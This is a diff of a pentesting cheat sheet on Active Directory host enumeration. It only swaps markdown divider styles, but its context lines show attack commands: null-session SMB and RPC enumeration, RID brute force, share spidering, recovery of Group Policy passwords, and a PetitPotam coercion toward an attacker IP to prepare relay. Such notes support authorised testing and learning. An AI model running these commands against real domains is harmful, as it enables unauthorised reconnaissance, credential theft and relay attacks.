@@ -18,7 +18,7 @@ linked:
 ---
 # AD - Hosts Enumeration - RPC, SMB & NetBIOS Probing
 
-***
+---
 
 ## Anonymous SMB / Null Session
 
@@ -42,7 +42,7 @@ nxc smb 10.0.0.0/24 -u '' -p '' --shares
 smbmap -H 10.0.0.0/24 -u '' -p ''
 ```
 
-___
+---
 
 ## Anonymous RPC Enumeration
 
@@ -69,7 +69,7 @@ rpcclient -U "" <DC> -N -c 'srvinfo;enumdomains;lsaquery;getdompwinfo;enumdomuse
 rpcclient -U 'corp\user%pass' <DC> -c 'enumdomusers;enumdomgroups;querydispinfo'
 ```
 
-___
+---
 
 ## RID Brute Force
 
@@ -98,7 +98,7 @@ nxc smb <DC> -u user -p pass --rid-brute 5000 |
 # 512: corp\Domain Admins (SidTypeGroup)
 ```
 
-___
+---
 
 ## enum4linux-ng / Comprehensive Probes
 
@@ -130,7 +130,7 @@ enum4linux-ng -A -u user -p pass <DC> -oJ corp_audit.json
 #  - Printer info
 ```
 
-___
+---
 
 ## SMB Share Spider / Content Recon
 
@@ -156,7 +156,7 @@ nxc smb hosts.txt -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml,ini,bat
 nxc smb <DC> -u u -p p -M gpp_password
 ```
 
-___
+---
 
 ## SMB Signing & Relay Prep
 
@@ -180,4 +180,4 @@ nxc smb all_hosts.txt --gen-relay-list relay_targets.txt
 # Terminal 2: PetitPotam.py -u '' -p '' <attacker-IP> <DC>
 ```
 
-***
+---
